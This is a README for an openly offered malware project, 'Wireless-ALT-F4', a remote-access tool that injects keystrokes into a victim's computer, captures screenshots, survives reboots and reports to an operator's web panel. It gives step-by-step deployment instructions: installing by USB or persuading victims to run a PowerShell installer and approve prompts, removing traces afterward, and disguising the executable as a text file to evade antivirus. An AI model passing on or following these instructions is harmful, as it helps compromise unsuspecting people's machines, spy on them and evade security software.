
# Wireless-ALT-F4

**Wireless-ALT-F4** is exactly what its name suggests — a malware-type tool that allows sending keyboard key events to a target computer without the victim noticing.  
I named it *Wireless-ALT-F4* because, initially, my idea was to create a tool that remotely shuts down a victim's PC using the **Alt + F4** keyboard combination. However, I soon realized that adding more key combinations would make it even more fun and powerful.  
Now, the tool supports multiple key combinations, and in the future, I plan to embed a full virtual keyboard, allowing complete remote control of the target's keyboard.  
In addition to sending key events, the tool can also capture and retrieve the latest screenshot from the victim’s computer, giving the user a live view of what’s running on the target machine.

> **NOTE:** If you are not familiar with this project or have not been invited to participate, this repository is not intended for your use.  
> It contains the files needed to install the malware on a victim’s PC.  
> The actual controller (admin panel) is accessible only to a limited group of authorized users.

# How It Works

First, you must manually install this tool on the victim’s PC or convince the victim to execute the installer script and accept all prompts by clicking "Yes" when asked.  
Once the script is executed, the tool will be installed on the victim’s machine.  
After installation, you can access the web-based admin panel (you should already be familiar with it if you're reading this documentation).  
On the admin panel, you will see a list of connected devices. From the menu, you can select a device and start exploiting its system.

# Features

- No issues if the victim restarts their PC — the connection will automatically recover once the system boots up.
- Admins do not need to install any setup manually. I (the Super Admin) have already configured everything on a VPS. Admins simply need access to the admin web page to manage the connected clients.
- The malware installer is available in two versions:
  - **USB Method (Fast):** Load the installer onto a USB drive, plug it into the victim’s PC, and execute the provided script. This will transfer and install the malware onto the victim's machine.
  - **Automated Installer (Slow):** Transfer and execute a single script on the victim’s PC. It will automatically download the malware from the server and complete the installation without requiring any further manual actions.

# How to Use

**Step 1:** Clone this repository.

**Step 2:** You will find three files: `launch.ps1`, `launch.ps2`, and `payload.txt`.
- **payload.txt:** This is actually the malware's executable, renamed as a text file to evade antivirus detection.
- **launch.ps1:** Used with the **USB Method**. Create a folder on your USB drive, copy `payload.txt` and `launch.ps1` into it, then plug the USB drive into the victim's PC. Double-click the `launch.ps1` file, approve all prompts by clicking "Yes", and the installation will complete automatically. Finally, remove your USB drive.
- **launch.ps2:** Used with the **Automated Installer** method. Transfer this file to the victim’s PC, convince them (or manually) to execute it, approve all prompts, and after the script completes, delete the script from their system.

**Step 3:** Access the admin panel (link provided if you are part of the authorized admin group), log in, and start exploiting.

# Information
* As new version of payload arrives I will update this repository hence you will get latest version of payload from here.
* Note that if victim's PC is not connected to internet so `launch2.ps1` will not work, consider using `USB method` in that case.
* When using `launch2.ps1` script so note that I will take time since it downloads this 9MB payload on target's PC using internet.

# License

This project is licensed under the [MIT License](LICENSE).

Copyright (c) 2025 Scihack/PowerPizza